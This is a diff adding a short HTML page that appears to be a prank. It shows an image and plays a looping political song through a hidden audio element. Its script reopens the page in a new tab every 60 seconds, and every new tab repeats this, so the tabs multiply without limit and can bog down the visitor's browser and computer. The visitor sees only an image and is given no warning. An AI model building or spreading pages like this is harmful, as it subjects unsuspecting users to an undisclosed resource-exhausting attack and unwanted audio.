@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Auto Play + Image</title>
+  <style>
+    body {
+      background-color: #000;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    #image {
+      max-width: 90%;
+      border-radius: 10px;
+      box-shadow: 0 0 30px #fff5;
+      margin-top: 20px;
+    }
+
+    audio {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Image Displayed Immediately -->
+  <img
+    id="image"
+    src="https://media.discordapp.net/attachments/1369297537848053781/1370261459048730685/2025050911493359.jpg?ex=6820d52e&is=681f83ae&hm=0f95430ea4d21f09d5a054bda37095a890c121c48ed5ecbc2b39851c2d7d43f2&=&format=webp&width=1376&height=774"
+    alt="Revealed Image"
+  >
+
+  <!-- Autoplay Background Music -->
+  <audio id="bgMusic" autoplay loop>
+    <source src="https://ia601501.us.archive.org/8/items/Communism_shall_rule_the_world_forever/Red%20sun%20in%20the%20sky.mp3" type="audio/mpeg">
+  </audio>
+
+  <script>
+    // Open a new tab every 60 seconds
+    setInterval(() => {
+      window.open(window.location.href, '_blank');
+    }, 60000);
+  </script>
+
+</body>
+</html>
